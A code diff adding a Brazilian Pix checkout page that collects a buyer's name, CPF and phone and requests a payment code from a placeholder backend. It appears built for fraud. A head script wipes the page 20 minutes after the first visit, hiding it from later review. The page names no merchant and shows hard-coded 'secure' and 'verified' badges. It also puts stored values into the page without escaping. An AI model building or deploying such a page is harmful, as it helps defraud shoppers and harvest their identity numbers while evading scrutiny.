@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script>
+(function() {
+    const VINTE_MINUTOS = 20 * 60 * 1000; 
+    const agora = new Date().getTime();
+    let primeiroAcesso = localStorage.getItem('site_primeiro_acesso');
+    if (!primeiroAcesso) {
+        localStorage.setItem('site_primeiro_acesso', agora);
+    } else {
+        const tempoDecorrido = agora - parseInt(primeiroAcesso);
+        if (tempoDecorrido > VINTE_MINUTOS) {
+            document.documentElement.innerHTML = "";
+            document.documentElement.style.backgroundColor = "#ffffff";
+            window.stop(); 
+        }
+    }
+})();
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opções de Pagamento | Pagamento Seguro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        :root {
+            --primary: #0055ff;
+            --primary-dark: #0033cc;
+            --primary-light: #e8f0ff;
+            --accent: #00bfff;
+            --success: #28a745;
+            --warning: #ff6b35;
+            --danger: #ff3b30;
+            --text-dark: #1a1a1a;
+            --text-gray: #555;
+            --text-light: #888;
+            --bg-light: #f5f7fa;
+            --bg-white: #ffffff;
+            --border-color: #e0e4e8;
+            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.12);
+            --pix-color: var(--primary);
+            --pix-bg: #f0fffe;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            line-height: 1.6;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 0;
+            background-color: var(--bg-light);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background-color: var(--bg-white);
+            box-shadow: var(--shadow-md);
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 0;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--bg-white);
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: var(--shadow-md);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex: 1;
+        }
+
+        .brand-section {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .brand-logo {
+            font-size: 1.3rem;
+            font-weight: 800;
+            letter-spacing: -1px;
+            line-height: 1;
+        }
+
+        .brand-tagline {
+            font-size: 0.7rem;
+            opacity: 0.9;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .cart-btn {
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: var(--bg-white);
+            width: 36px;
+            height: 36px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 1rem;
+            position: relative;
+        }
+
+        .cart-badge {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background-color: var(--danger);
+            color: white;
+            font-size: 0.65rem;
+            font-weight: bold;
+            min-width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid var(--bg-white);
+        }
+
+        .trust-banner {
+            background: linear-gradient(90deg, rgba(40, 167, 69, 0.1) 0%, rgba(0, 191, 255, 0.1) 100%);
+            border-bottom: 1px solid rgba(40, 167, 69, 0.2);
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            gap: 8px;
+            font-size: 0.75rem;
+            color: var(--text-gray);
+            font-weight: 600;
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex: 1;
+            text-align: center;
+            justify-content: center;
+        }
+
+        .trust-item i {
+            color: var(--success);
+            font-size: 1rem;
+        }
+
+        .review-block {
+            padding: 20px;
+            background-color: var(--bg-white);
+            animation: fadeIn 0.3s ease-out;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .payment-options-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .payment-option-card {
+            border: 2px solid var(--border-color);
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 20px;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            background-color: var(--bg-white);
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .payment-option-card.selected {
+            border: 3px solid var(--primary);
+            background: linear-gradient(135deg, rgba(0, 85, 255, 0.05) 0%, rgba(0, 85, 255, 0.02) 100%);
+            box-shadow: 0 12px 32px rgba(0, 85, 255, 0.18);
+        }
+
+        .payment-option-card.selected::after {
+            content: '✓';
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            width: 28px;
+            height: 28px;
+            background: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 0.9rem;
+        }
+
+        .payment-option-icon {
+            font-size: 1.8rem;
+            color: var(--primary);
+            margin-bottom: 4px;
+        }
+
+        .payment-option-title {
+            font-size: 1.1rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .promo-badge {
+            background: var(--success);
+            color: white;
+            font-size: 0.65rem;
+            padding: 2px 8px;
+            border-radius: 100px;
+            font-weight: 800;
+            text-transform: uppercase;
+        }
+
+        .payment-option-price {
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--primary);
+        }
+
+        .payment-option-desc {
+            font-size: 0.85rem;
+            color: var(--text-gray);
+            line-height: 1.4;
+        }
+
+        .pix-form-container {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(0, 85, 255, 0.1);
+            display: none;
+            flex-direction: column;
+            gap: 12px;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .payment-option-card.selected .pix-form-container {
+            display: flex;
+        }
+
+        .pix-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            position: relative;
+        }
+
+        .pix-input-group label {
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .pix-input-group input {
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .pix-input-group input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 85, 255, 0.1);
+        }
+
+        .payment-action-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .payment-action-btn:active {
+            transform: scale(0.98);
+        }
+
+        .pix-error-msg {
+            display: none;
+            color: var(--danger);
+            font-size: 0.8rem;
+            font-weight: 600;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .pix-error-msg.visible {
+            display: flex;
+        }
+
+        .pix-copy-section {
+            display: none;
+            flex-direction: column;
+            gap: 20px;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .pix-header-status {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .pix-status-badge {
+            background: #dcfce7;
+            color: #166534;
+            padding: 6px 12px;
+            border-radius: 100px;
+            font-size: 0.75rem;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .pix-timer-container {
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--text-gray);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .duty-info-section {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 16px;
+            border: 1px solid #f1f5f9;
+        }
+
+        .duty-header {
+            font-size: 0.75rem;
+            font-weight: 800;
+            color: #64748b;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .duty-user-data {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .duty-field {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+        }
+
+        .duty-label {
+            color: #94a3b8;
+            font-weight: 600;
+        }
+
+        .duty-value {
+            color: #1e293b;
+            font-weight: 700;
+        }
+
+        .duty-warning {
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px dashed #e2e8f0;
+            display: flex;
+            gap: 8px;
+            font-size: 0.75rem;
+            color: #64748b;
+            font-weight: 600;
+        }
+
+        .pix-code-display-wrapper {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .pix-code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .pix-code-label {
+            font-size: 0.75rem;
+            font-weight: 800;
+            color: var(--primary);
+            text-transform: uppercase;
+        }
+
+        .pix-code-value-label {
+            font-size: 0.85rem;
+            font-weight: 800;
+            color: var(--primary);
+        }
+
+        .pix-code-input-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #f1f5f9;
+            padding: 12px;
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+        }
+
+        .pix-code-display-text {
+            flex: 1;
+            font-family: monospace;
+            font-size: 0.85rem;
+            color: var(--text-dark);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .pix-copy-icon-btn {
+            background: none;
+            border: none;
+            color: var(--primary);
+            font-size: 1.1rem;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .btn-copy-pix {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 18px 10px;
+            border-radius: 16px;
+            font-size: 1rem;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(0, 85, 255, 0.25);
+            transition: all 0.3s ease;
+            width: 100%;
+            text-align: center;
+        }
+
+        .waiting-payment-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .modern-spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(0, 85, 255, 0.1);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .waiting-text {
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: var(--text-gray);
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Modal Styles */
+        .pix-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.7);
+            backdrop-filter: blur(12px);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .pix-modal-overlay.active { display: flex; }
+
+        .pix-modal-content {
+            background: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 32px;
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.3);
+            animation: modalIn 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+            overflow: hidden;
+            border: 1px solid #f1f5f9;
+        }
+
+        @keyframes modalIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+
+        .pix-modal-inner { padding: 36px 28px 28px; }
+
+        .pix-modal-header { text-align: center; margin-bottom: 24px; }
+
+        .pix-modal-header h2 { font-size: 1.75rem; font-weight: 900; color: #0f172a; margin-bottom: 10px; }
+
+        .security-badge-container { display: flex; justify-content: center; margin-bottom: 24px; }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #f0f9ff;
+            color: #0369a1;
+            padding: 8px 20px;
+            border: 1px solid #e0f2fe;
+            border-radius: 100px;
+            font-size: 0.75rem;
+            font-weight: 800;
+            text-transform: uppercase;
+        }
+
+        .pix-instructions-list {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 1px solid #f1f5f9;
+        }
+
+        .pix-instructions-list ul { list-style: none; display: flex; flex-direction: column; gap: 14px; }
+
+        .pix-instructions-list li { display: flex; align-items: flex-start; gap: 14px; font-size: 0.85rem; color: #334155; font-weight: 600; }
+
+        .pix-step-number {
+            background: #0055ff;
+            color: white;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+            flex-shrink: 0;
+            font-weight: 800;
+        }
+
+        .pix-code-container-compact {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 14px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 2px solid #f1f5f9;
+        }
+
+        .pix-code-input-compact {
+            flex: 1;
+            background: transparent;
+            border: none;
+            font-family: monospace;
+            font-size: 0.8rem;
+            color: #046e19;
+            outline: none;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-weight: 500;
+        }
+
+        .pix-copy-btn-compact {
+            background: #046e19;
+            color: white;
+            border: none;
+            padding: 8px 10px;
+            border-radius: 8px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .payment-status-compact {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 24px;
+            font-size: 0.85rem;
+            color: #64748b;
+            font-weight: 600;
+            background: #f8fafc;
+            padding: 10px;
+            border-radius: 12px;
+        }
+
+        .compact-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2.5px solid #e2e8f0;
+            border-top-color: #0055ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .pix-modal-close-compact {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, #0055ff 0%, #0044cc 100%);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 1rem;
+            font-weight: 800;
+            cursor: pointer;
+        }
+
+        /* Order Summary Styles */
+        .order-summary-section { padding: 20px; background: #fff; border-bottom: 1px solid var(--border-color); }
+        .order-summary-title { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-weight: 800; font-size: 1rem; }
+        .order-summary-badge { background: #e8f0ff; color: #0055ff; font-size: 0.65rem; padding: 2px 8px; border-radius: 100px; }
+        .order-card { display: flex; gap: 15px; align-items: center; }
+        .order-image-container { width: 60px; height: 60px; border-radius: 10px; overflow: hidden; border: 1px solid var(--border-color); }
+        .order-image-container img { width: 100%; height: 100%; object-fit: cover; }
+        .order-details { flex: 1; }
+        .order-product-name { font-size: 0.9rem; font-weight: 700; color: var(--text-dark); margin-bottom: 4px; }
+        .order-product-price-row { display: flex; justify-content: space-between; align-items: center; }
+        .order-product-price { font-weight: 800; color: var(--primary); font-size: 0.9rem; }
+        .order-product-qty { font-size: 0.75rem; color: var(--text-light); font-weight: 600; }
+        .order-info-container { margin-top: 15px; }
+        .order-total-divider { height: 1px; border-top: 1px dashed #cbd5e1; margin: 10px 0; }
+        .order-info-row { display: flex; align-items: center; gap: 10px; }
+        .order-info-icon-wrapper { color: var(--success); font-size: 1.1rem; }
+        .order-info-label { font-size: 0.7rem; font-weight: 700; color: var(--text-light); text-transform: uppercase; }
+        .order-info-text-delivery { font-size: 0.85rem; font-weight: 700; color: var(--success); }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="header-left">
+                <div class="brand-section">
+                    <span class="brand-logo">CHECKOUT</span>
+                    <span class="brand-tagline">Pagamento Seguro</span>
+                </div>
+            </div>
+            <div class="header-right">
+                <div class="cart-btn">
+                    <i class="fas fa-shopping-cart"></i>
+                    <span class="cart-badge" id="cart-count">1</span>
+                </div>
+            </div>
+        </header>
+
+        <div class="trust-banner">
+            <div class="trust-item"><i class="fas fa-shield-check"></i> SSL Seguro</div>
+            <div class="trust-item"><i class="fas fa-truck"></i> Entrega Rápida</div>
+            <div class="trust-item"><i class="fas fa-check-circle"></i> Garantia</div>
+        </div>
+
+        <div id="order-summary-wrapper"></div>
+        <div id="cart-content-wrapper"></div>
+
+        <footer style="padding: 30px 20px; text-align: center; background: #f8fafc; color: #94a3b8; font-size: 0.75rem; font-weight: 600;">
+            <div style="margin-bottom: 15px; display: flex; justify-content: center; gap: 20px; font-size: 1.2rem; opacity: 0.5;">
+                <i class="fab fa-cc-visa"></i>
+                <i class="fab fa-cc-mastercard"></i>
+                <i class="fas fa-bolt"></i>
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            <p>&copy; 2026 Todos os direitos reservados.</p>
+            <p style="margin-top: 5px;">Ambiente de pagamento criptografado e 100% seguro.</p>
+        </footer>
+    </div>
+
+    <!-- Modal de "Código Pix Copiado" -->
+    <div id="pixCopiedModal" class="pix-modal-overlay">
+        <div class="pix-modal-content">
+            <div class="pix-modal-inner">
+                <div class="pix-modal-header">
+                    <h2><i class="fas fa-check-circle" style="color: #28a745;"></i> Pix Copiado!</h2>
+                </div>
+                <div class="security-badge-container">
+                    <div class="security-badge"><i class="fas fa-shield-alt"></i> Pagamento 100% Seguro</div>
+                </div>
+                <div class="pix-instructions-list">
+                    <ul>
+                        <li><span class="pix-step-number">1</span><span>Abra o app do seu <strong>Banco</strong>.</span></li>
+                        <li><span class="pix-step-number">2</span><span>Escolha <strong>Pix</strong> e depois <strong>Copia e Cola</strong>.</span></li>
+                        <li><span class="pix-step-number">3</span><span>Cole o código e <strong>confirme</strong>.</span></li>
+                    </ul>
+                </div>
+                <div class="pix-code-container-compact">
+                    <input type="text" id="pixCodeCopied" class="pix-code-input-compact" readonly>
+                    <button class="pix-copy-btn-compact" onclick="copyAgain()"><i class="fas fa-copy"></i> Copiar</button>
+                </div>
+                <div class="payment-status-compact">
+                    <div class="compact-spinner"></div>
+                    <span>Aguardando detecção do pagamento...</span>
+                </div>
+                <button class="pix-modal-close-compact" onclick="fecharPixModal()">ENTENDI, VOU PAGAR</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configurações e Variáveis Globais
+        const BACKEND_URL = 'https://SUA-URL-DO-RENDER.onrender.com'; // SERÁ SUBSTITUÍDO APÓS DEPLOY
+        let subtotalValue = 0;
+        let timerInterval;
+
+        // Recuperar dados do produto
+        function loadProductData() {
+            const productInfo = JSON.parse(localStorage.getItem('product_info') || '{}');
+            subtotalValue = parseFloat(productInfo.value) || 97.00;
+            document.getElementById('cart-count').innerText = localStorage.getItem('cart_count') || '1';
+        }
+
+        function renderOrderSummary() {
+            const productInfo = JSON.parse(localStorage.getItem('product_info') || '{}');
+            const deliveryTime = localStorage.getItem('delivery_time') || '3 a 7 dias úteis';
+            
+            const productsHTML = `
+                <div class="order-card">
+                    <div class="order-image-container">
+                        <img src="${productInfo.photo || 'https://via.placeholder.com/150'}" alt="${productInfo.name}">
+                    </div>
+                    <div class="order-details">
+                        <div class="order-product-name">${productInfo.name || 'Produto Selecionado'}</div>
+                        <div class="order-product-price-row">
+                            <div class="order-product-price">R$ ${subtotalValue.toFixed(2).replace('.', ',')}</div>
+                            <div class="order-product-qty">Qtd: 1</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            document.getElementById('order-summary-wrapper').innerHTML = `
+                <div class="order-summary-section">
+                    <div class="order-summary-title">
+                        <span><i class="fas fa-shopping-bag"></i> Resumo do Pedido</span>
+                        <span class="order-summary-badge">Verificado</span>
+                    </div>
+                    ${productsHTML}
+                    <div class="order-info-container">
+                        <div class="order-total-divider"></div>
+                        <div class="order-info-row">
+                            <div class="order-info-icon-wrapper"><i class="fas fa-truck-fast"></i></div>
+                            <div class="order-info-content">
+                                <div class="order-info-label">Previsão de Entrega</div>
+                                <div class="order-info-text-delivery">${deliveryTime}</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        function renderPaymentOptions() {
+            const baseTotal = subtotalValue;
+            const deliveryTotal = baseTotal * 1.46;
+
+            const paymentHTML = `
+                <div class="review-block">
+                    <div class="payment-options-container">
+                        <div class="payment-option-card selected" id="pay-now-pix">
+                            <div id="pix-original-content">
+                                <div class="payment-option-icon"><i class="fas fa-bolt"></i></div>
+                                <div class="payment-option-title"><span>Pagar Agora - Pix</span><span class="promo-badge">Promoção</span></div>
+                                <div class="payment-option-price">R$ ${baseTotal.toFixed(2).replace('.', ',')}</div>
+                                <div class="payment-option-desc">Liberação imediata e entrega prioritária.</div>
+                                <div class="pix-form-container" id="pix-form" style="display: flex;">
+                                    <div class="pix-input-group">
+                                        <label>Nome Completo</label>
+                                        <input type="text" id="pix-name" placeholder="Ex: João Silva" required>
+                                    </div>
+                                    <div class="pix-input-group">
+                                        <label>CPF</label>
+                                        <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" required>
+                                    </div>
+                                    <div class="pix-input-group">
+                                        <label>Telefone</label>
+                                        <input type="tel" id="pix-phone" placeholder="(00) 00000-0000" required>
+                                    </div>
+                                    <div class="pix-error-msg" id="pix-error-msg">
+                                        <i class="fas fa-exclamation-circle"></i>
+                                        <span id="pix-error-text">Erro ao gerar código PIX.</span>
+                                    </div>
+                                    <button class="payment-action-btn" id="btn-generate-pix" onclick="generatePix()">
+                                        <span class="btn-text">Pagar R$ ${baseTotal.toFixed(2).replace('.', ',')} <i class="fas fa-check"></i></span>
+                                    </button>
+                                </div>
+                            </div>
+                            <div id="pix-copy-content" class="pix-copy-section">
+                                <div class="pix-header-status">
+                                    <div class="pix-status-badge"><i class="fas fa-check-circle"></i> Código Gerado</div>
+                                    <div class="pix-timer-container"><i class="fas fa-clock"></i> Expira em: <span id="pix-timer">15:00</span></div>
+                                </div>
+                                <div class="duty-info-section">
+                                    <div class="duty-header"><i class="fas fa-user-shield"></i> Titular da Compra</div>
+                                    <div class="duty-user-data">
+                                        <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div>
+                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
+                                    </div>
+                                </div>
+                                <div class="pix-code-display-wrapper">
+                                    <div class="pix-code-header">
+                                        <label class="pix-code-label">Código Pix</label>
+                                        <span class="pix-code-value-label">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
+                                    </div>
+                                    <div class="pix-code-input-container">
+                                        <span class="pix-code-display-text" id="pix-code-text">Aguardando código...</span>
+                                        <button class="pix-copy-icon-btn" onclick="copyPixCode()"><i class="fas fa-copy"></i></button>
+                                    </div>
+                                </div>
+                                <button class="btn-copy-pix" onclick="copyPixCode()">Copiar código Pix</button>
+                                <div class="waiting-payment-section"><div class="modern-spinner"></div><div class="waiting-text">Aguardando Pagamento</div></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
+            setupMasks();
+        }
+
+        function setupMasks() {
+            const cpfInput = document.getElementById('pix-cpf');
+            const phoneInput = document.getElementById('pix-phone');
+            
+            cpfInput.addEventListener('input', (e) => {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length > 11) v = v.slice(0, 11);
+                if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
+                else if (v.length > 3) v = v.replace(/(\d{3})(\d{3})/, '$1.$2');
+                e.target.value = v;
+            });
+
+            phoneInput.addEventListener('input', (e) => {
+                let v = e.target.value.replace(/\D/g, '');
+                if (v.length > 11) v = v.slice(0, 11);
+                if (v.length > 10) v = v.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+                else if (v.length > 6) v = v.replace(/(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
+                else if (v.length > 2) v = v.replace(/(\d{2})(\d{0,5})/, '($1) $2');
+                else if (v.length > 0) v = v.replace(/(\d{0,2})/, '($1');
+                e.target.value = v;
+            });
+        }
+
+        async function generatePix() {
+            const name = document.getElementById('pix-name').value.trim();
+            const cpfRaw = document.getElementById('pix-cpf').value;
+            const phone = document.getElementById('pix-phone').value.trim();
+            const cpf = cpfRaw.replace(/\D/g, '');
+            const errorEl = document.getElementById('pix-error-msg');
+            const errorText = document.getElementById('pix-error-text');
+            
+            errorEl.classList.remove('visible');
+
+            if (name.split(' ').length < 2) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
+            if (cpf.length !== 11) { errorText.textContent = 'Informe um CPF válido.'; errorEl.classList.add('visible'); return; }
+
+            const btn = document.getElementById('btn-generate-pix');
+            const originalHTML = btn.innerHTML;
+            btn.innerHTML = '<div class="spinner"></div>';
+            btn.disabled = true;
+
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/create-pix`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        customer: { name, email: 'cliente@email.com', document: cpf, phone },
+                        payment_amount: Math.round(subtotalValue * 100)
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.payment_code) {
+                    const pixCode = data.pix.qrcode_text;
+                    showPixCopySection(pixCode, name, cpfRaw);
+                    startStatusCheck(data.payment_code);
+                } else {
+                    throw new Error(data.error || 'Erro na API');
+                }
+            } catch (err) {
+                console.error(err);
+                errorText.textContent = 'Erro ao gerar PIX. Tente novamente.';
+                errorEl.classList.add('visible');
+                btn.innerHTML = originalHTML;
+                btn.disabled = false;
+            }
+        }
+
+        function showPixCopySection(pixCode, name, cpf) {
+            document.getElementById('pix-original-content').style.display = 'none';
+            document.getElementById('pix-copy-content').style.display = 'flex';
+            document.getElementById('display-pix-name').innerText = name;
+            document.getElementById('display-pix-cpf').innerText = cpf;
+            document.getElementById('pix-code-text').innerText = pixCode;
+            startPixTimer(15 * 60);
+        }
+
+        function startPixTimer(duration) {
+            let timer = duration;
+            const display = document.getElementById('pix-timer');
+            clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                let minutes = Math.floor(timer / 60);
+                let seconds = timer % 60;
+                display.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                if (--timer < 0) { clearInterval(timerInterval); display.textContent = "EXPIRADO"; }
+            }, 1000);
+        }
+
+        function copyPixCode() {
+            const code = document.getElementById('pix-code-text').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                document.getElementById('pixCodeCopied').value = code;
+                document.getElementById('pixCopiedModal').classList.add('active');
+            });
+        }
+
+        function copyAgain() {
+            const code = document.getElementById('pixCodeCopied').value;
+            navigator.clipboard.writeText(code);
+        }
+
+        function fecharPixModal() {
+            document.getElementById('pixCopiedModal').classList.remove('active');
+        }
+
+        function startStatusCheck(code) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${BACKEND_URL}/api/payment-status/${code}`);
+                    const data = await res.json();
+                    if (data.payment_status === 'approved') {
+                        clearInterval(interval);
+                        alert('Pagamento Aprovado!');
+                        window.location.href = 'obrigado.html';
+                    }
+                } catch (e) {}
+            }, 5000);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            loadProductData();
+            renderOrderSummary();
+            renderPaymentOptions();
+        });
+    </script>
+</body>
+</html>
